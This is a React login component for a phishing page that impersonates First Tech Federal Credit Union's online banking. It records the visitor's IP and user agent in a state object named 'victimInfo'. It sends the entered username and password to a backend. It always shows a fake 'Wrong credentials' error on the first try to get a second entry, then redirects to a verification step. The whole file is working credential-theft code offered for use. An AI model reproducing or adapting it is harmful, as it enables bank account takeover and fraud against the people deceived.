import React, { useEffect, useState } from "react";
import { useHistory, Link } from "react-router-dom";
import { PiEyeFill, PiEyeSlashFill } from "react-icons/pi";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ username: "", password: "" });
  const [isError, setIsError] = useState({ username: false, password: false });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleClick = () => {
    if (!data?.username?.trim()) {
      setIsError((prev) => ({ ...prev, username: true }));
    }
    if (!data?.password?.trim()) {
      setIsError((prev) => ({ ...prev, password: true }));
    }

    if (data?.username?.trim()) {
      setIsError((prev) => ({ ...prev, username: false }));
    }
    if (data?.password?.trim()) {
      setIsError((prev) => ({ ...prev, password: false }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "First Tech Federal Credit Union",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ username: "", password: "" });
          setIsError({ username: false, password: false });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={"Welcome to Online Banking"}
    >
      <Input
        title="Username"
        name="username"
        value={data?.username}
        onChange={handleChange}
        onBlur={handleClick}
        isError={isError?.username}
        isWrong={isWrong}
      />
      <Input
        title="Password"
        type={!isShowPass ? "password" : "text"}
        name="password"
        value={data?.password}
        onChange={handleChange}
        onBlur={handleClick}
        isError={isError?.password}
        isWrong={isWrong}
      >
        <span
          className="absolute top-[18px] right-4"
          onClick={() => setIsShowPass((prev) => !prev)}
        >
          {!isShowPass ? (
            <PiEyeFill fontSize={22} />
          ) : (
            <PiEyeSlashFill fontSize={22} />
          )}
        </span>
      </Input>

      <div className="w-full flex items-center text-sm">
        <div
          className="h-[24px] tooltip before:bg-white before:text-[#333333] before:rounded-full before:max-w-[22rem] before:shadow-[1px_1px_20px_0px_#00000052] after:hidden "
          data-tip="Don't select if you are using public computer."
        >
          <input
            type="checkbox"
            className="toggle toggle-accent mr-4 [--tglbg:#f2f2f2] border-0"
          />
        </div>
        <label>Remember Me</label>
      </div>

      {isWrong && (
        <div
          role="alert"
          className="alert alert-error my-4 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            className="stroke-[#ce1616] shrink-0 w-6 h-6"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
            ></path>
          </svg>
          <span>Wrong credentials.</span>
        </div>
      )}

      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Log in"
          )
        }
      />

      <p className="text-[12px] text-center">
        Forgot{" "}
        <Link
          className="text-[#0267c1]"
          to="#"
        >
          Username
        </Link>{" "}
        or{" "}
        <Link
          className="text-[#0267c1]"
          to="#"
        >
          Password
        </Link>
        ?
      </p>
      <button className="mt-6 py-[14px] px-6 text-[green] font-[800] rounded-[100px] text-center w-full hover:bg-[#dfebdf]">
        Register a New Account
      </button>
    </FormLayout>
  );
};

export default Login;
